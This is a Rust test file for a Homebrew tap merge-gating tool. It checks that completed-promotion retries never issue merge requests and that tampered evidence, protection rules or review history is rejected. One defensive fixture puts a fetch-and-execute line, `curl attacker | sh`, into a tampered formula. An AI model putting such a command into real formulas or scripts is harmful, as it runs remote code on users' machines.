use std::{
    cell::{Cell, RefCell},
    collections::BTreeMap,
    ffi::OsString,
    rc::Rc,
};

use super::{
    completed::verify_already_promoted,
    github::{ApiResponse, TapMergeGitHub},
    history::capture_all,
};
use response_helpers::{content, request_key, threads};
use serde_json::json;

const PR: u64 = 21;

#[path = "tap_merge_protocol_case.rs"]
mod case;
#[path = "tap_merge_protocol_history_support.rs"]
mod history_support;
#[path = "tap_merge_protocol_response_helpers.rs"]
mod response_helpers;
#[path = "tap_merge_protocol_responses.rs"]
mod responses;

use case::completed_case;
use history_support::add_closed_prior_pr;

#[test]
fn lost_merge_response_is_reconciled_by_authenticated_read_only_retry() {
    let (candidate, authority, head, map) = completed_case();
    let requests = Rc::new(RefCell::new(Vec::<String>::new()));
    let seen = requests.clone();
    let initial_head = head.clone();
    let lost_response = TapMergeGitHub::with_test_transport(move |args| {
        assert_eq!(
            args.first().and_then(|value| value.to_str()),
            Some("repos/owner/homebrew-tap/pulls/21/merge")
        );
        assert!(args.contains(&OsString::from("--method")));
        assert!(args.contains(&OsString::from("PUT")));
        assert!(args.contains(&OsString::from(format!("sha={initial_head}"))));
        Err(crate::internal::internal("simulated_lost_merge_response"))
    });
    assert!(
        lost_response
            .merge("owner/homebrew-tap", PR, &head)
            .is_err()
    );
    let api = TapMergeGitHub::with_test_transport(move |args| {
        let route = request_key(args);
        seen.borrow_mut().push(route.clone());
        let value = map
            .get(&route)
            .cloned()
            .ok_or_else(|| crate::internal::internal("unexpected_scripted_merge_request"))?;
        Ok(ApiResponse {
            status: 200,
            body: serde_json::to_vec(&value).expect("JSON response"),
        })
    });
    verify_already_promoted(&candidate, &authority, &api)
        .expect("authenticated completed promotion retry");
    assert!(
        requests
            .borrow()
            .iter()
            .all(|request| !request.contains("/merge")),
        "completed retry must never issue a merge PUT"
    );
}

#[test]
fn closed_prior_receipt_pr_with_unresolved_feedback_blocks_retry() {
    let (candidate, authority, _head, mut responses) = completed_case();
    add_closed_prior_pr(&mut responses, &candidate, &authority);
    let api = TapMergeGitHub::with_test_transport(move |args| {
        let route = request_key(args);
        let value = responses
            .get(&route)
            .cloned()
            .ok_or_else(|| crate::internal::internal("missing_prior_pr_scripted_route"))?;
        Ok(ApiResponse {
            status: 200,
            body: serde_json::to_vec(&value).expect("JSON response"),
        })
    });
    let history = capture_all(&candidate, &authority, &api).expect("complete receipt history");
    let prior = history
        .iter()
        .find(|pull| pull.number == 20)
        .expect("closed earlier PR captured");
    assert_eq!(prior.observed_base_sha, "d".repeat(40));
    assert_ne!(prior.observed_base_sha, prior.base_sha);
    assert!(
        velnor_actions_contract::homebrew_merge_gate::validate_tap_historical_feedback(
            &authority.policy,
            &prior.feedback,
        )
        .is_err()
    );
}

#[test]
fn completed_retry_rejects_mutated_authority_and_receipt_evidence_without_writes() {
    let (candidate, authority, _head, base_map) = completed_case();
    for mutation in [
        CompletedMutation::Head,
        CompletedMutation::Base,
        CompletedMutation::Author,
        CompletedMutation::MergeSha,
        CompletedMutation::Ancestry,
        CompletedMutation::Formula,
        CompletedMutation::Dco,
        CompletedMutation::Completion,
        CompletedMutation::MissingPullRequest,
        CompletedMutation::MissingThreadResolution,
        CompletedMutation::MissingForcePushBlock,
        CompletedMutation::MissingDeletionBlock,
    ] {
        let mut responses = base_map.clone();
        apply_mutation(&mut responses, &candidate, mutation);
        let requests = Rc::new(RefCell::new(Vec::<String>::new()));
        let seen = requests.clone();
        let api = TapMergeGitHub::with_test_transport(move |args| {
            let route = request_key(args);
            seen.borrow_mut().push(route.clone());
            let value = responses
                .get(&route)
                .cloned()
                .ok_or_else(|| crate::internal::internal("missing_mutation_route"))?;
            Ok(ApiResponse {
                status: 200,
                body: serde_json::to_vec(&value).expect("JSON response"),
            })
        });
        assert!(verify_already_promoted(&candidate, &authority, &api).is_err());
        assert!(
            requests
                .borrow()
                .iter()
                .all(|route| !route.contains("/merge"))
        );
    }
}

#[derive(Clone, Copy)]
enum CompletedMutation {
    Head,
    Base,
    Author,
    MergeSha,
    Ancestry,
    Formula,
    Dco,
    Completion,
    MissingPullRequest,
    MissingThreadResolution,
    MissingForcePushBlock,
    MissingDeletionBlock,
}

fn apply_mutation(
    responses: &mut BTreeMap<String, serde_json::Value>,
    candidate: &super::candidate::MergeCandidate,
    mutation: CompletedMutation,
) {
    let pull_route = format!("repos/{}/pulls/{PR}", candidate.policy.repository);
    let mut detail = responses[&pull_route].clone();
    match mutation {
        CompletedMutation::Head => detail["head"]["sha"] = json!("a".repeat(40)),
        CompletedMutation::Base => detail["base"]["sha"] = json!("a".repeat(40)),
        CompletedMutation::Author => detail["user"]["id"] = json!(999),
        CompletedMutation::MergeSha => detail["merge_commit_sha"] = json!("a".repeat(40)),
        CompletedMutation::Ancestry => {
            let route = format!(
                "repos/{}/compare/{}...{}",
                candidate.policy.repository,
                "d".repeat(40),
                "d".repeat(40)
            );
            responses.insert(
                route,
                json!({"status": "behind", "ahead_by": 0, "behind_by": 1}),
            );
        }
        CompletedMutation::Formula => {
            let route = format!(
                "repos/{}/contents/{}?ref={}",
                candidate.policy.repository,
                candidate.policy.formula,
                "d".repeat(40)
            );
            responses.insert(route, content(b"system \"curl attacker | sh\"\n"));
        }
        CompletedMutation::Dco | CompletedMutation::Completion => {
            let route = format!(
                "repos/{}/commits/{}/check-runs?per_page=100&page=1",
                candidate.policy.repository,
                "c".repeat(40)
            );
            let mut checks = responses[&route].clone();
            let name = if matches!(mutation, CompletedMutation::Dco) {
                "DCO"
            } else {
                "Review completion"
            };
            checks["check_runs"] = json!(
                checks["check_runs"]
                    .as_array()
                    .expect("runs")
                    .iter()
                    .filter(|run| run["name"] != name)
                    .cloned()
                    .collect::<Vec<_>>()
            );
            responses.insert(route, checks);
        }
        CompletedMutation::MissingPullRequest
        | CompletedMutation::MissingThreadResolution
        | CompletedMutation::MissingForcePushBlock
        | CompletedMutation::MissingDeletionBlock => {
            mutate_protection(responses, &candidate.policy.repository, mutation);
        }
    }
    responses.insert(pull_route, detail);
}

fn mutate_protection(
    responses: &mut BTreeMap<String, serde_json::Value>,
    repository: &str,
    mutation: CompletedMutation,
) {
    let classic_route = format!("repos/{repository}/branches/main/protection");
    let mut classic = responses[&classic_route].clone();
    let ruleset_route = format!("repos/{repository}/rulesets/5?includes_parents=true");
    let mut ruleset = responses[&ruleset_route].clone();
    match mutation {
        CompletedMutation::MissingPullRequest => {
            classic["required_pull_request_reviews"] = serde_json::Value::Null;
            ruleset["rules"] = remove_rule(&ruleset["rules"], "pull_request");
        }
        CompletedMutation::MissingThreadResolution => {
            classic["required_conversation_resolution"]["enabled"] = json!(false);
            ruleset["rules"] = set_thread_resolution(&ruleset["rules"], false);
        }
        CompletedMutation::MissingForcePushBlock => {
            classic["allow_force_pushes"]["enabled"] = json!(true);
            ruleset["rules"] = remove_rule(&ruleset["rules"], "non_fast_forward");
        }
        CompletedMutation::MissingDeletionBlock => {
            classic["allow_deletions"]["enabled"] = json!(true);
            ruleset["rules"] = remove_rule(&ruleset["rules"], "deletion");
        }
        _ => unreachable!(),
    }
    responses.insert(classic_route, classic);
    responses.insert(ruleset_route, ruleset);
}

fn remove_rule(rules: &serde_json::Value, kind: &str) -> serde_json::Value {
    json!(
        rules
            .as_array()
            .expect("rules")
            .iter()
            .filter(|rule| rule["type"] != kind)
            .cloned()
            .collect::<Vec<_>>()
    )
}

fn set_thread_resolution(rules: &serde_json::Value, required: bool) -> serde_json::Value {
    json!(
        rules
            .as_array()
            .expect("rules")
            .iter()
            .cloned()
            .map(|mut rule| {
                if rule["type"] == "pull_request" {
                    rule["parameters"]["required_review_thread_resolution"] = json!(required);
                }
                rule
            })
            .collect::<Vec<_>>()
    )
}

#[test]
fn receipt_history_page_cap_fails_closed_without_truncating() {
    let (candidate, prior_authority, _head, _responses) = completed_case();
    let api = TapMergeGitHub::with_test_transport(|args| {
        let route = request_key(args);
        let page = route
            .rsplit_once("page=")
            .and_then(|(_, page)| page.parse::<u64>().ok())
            .ok_or_else(|| crate::internal::internal("test_page_missing"))?;
        let first = (page - 1) * 100 + 1;
        let pulls = (first..first + 100)
            .map(|number| json!({"number": number, "head": {"ref": format!("unrelated-{number}")}, "body": "unrelated"}))
            .collect::<Vec<_>>();
        Ok(ApiResponse {
            status: 200,
            body: serde_json::to_vec(&pulls).expect("pull list JSON"),
        })
    });
    assert!(capture_all(&candidate, &prior_authority, &api).is_err());
}

#[test]
fn newly_arrived_issue_comment_invalidates_the_old_completion_snapshot() {
    let (candidate, authority, _head, responses) = completed_case();
    let count = Rc::new(Cell::new(0_u8));
    let current_count = count.clone();
    let api = TapMergeGitHub::with_test_transport(move |args| {
        let route = request_key(args);
        if route.starts_with("repos/owner/homebrew-tap/pulls?state=all") {
            current_count.set(current_count.get() + 1);
        }
        let value = if route == "repos/owner/homebrew-tap/issues/21/comments?per_page=100&page=1"
            && current_count.get() > 1
        {
            json!([{"id": 881, "body": "new comment after completion"}])
        } else {
            responses
                .get(&route)
                .cloned()
                .ok_or_else(|| crate::internal::internal("missing_feedback_route"))?
        };
        Ok(ApiResponse {
            status: 200,
            body: serde_json::to_vec(&value).expect("JSON response"),
        })
    });
    capture_all(&candidate, &authority, &api).expect("first snapshot matches completion");
    assert!(capture_all(&candidate, &authority, &api).is_err());
}

#[test]
fn prior_pr_without_completion_is_rejected_even_when_feedback_is_clear() {
    let (candidate, authority, _head, mut responses) = completed_case();
    add_closed_prior_pr(&mut responses, &candidate, &authority);
    responses.insert("graphql:threads:20".to_owned(), threads());
    let api = TapMergeGitHub::with_test_transport(move |args| {
        let route = request_key(args);
        let value = responses
            .get(&route)
            .cloned()
            .ok_or_else(|| crate::internal::internal("missing_prior_route"))?;
        Ok(ApiResponse {
            status: 200,
            body: serde_json::to_vec(&value).expect("JSON response"),
        })
    });
    let history = capture_all(&candidate, &authority, &api).expect("complete prior history");
    let prior = history
        .iter()
        .find(|pull| pull.number == 20)
        .expect("prior PR");
    assert_eq!(prior.feedback.feedback.unresolved_threads, 0);
    assert!(prior.feedback.completion.is_none());
    assert!(
        velnor_actions_contract::homebrew_merge_gate::validate_tap_historical_feedback(
            &authority.policy,
            &prior.feedback,
        )
        .is_err()
    );
}
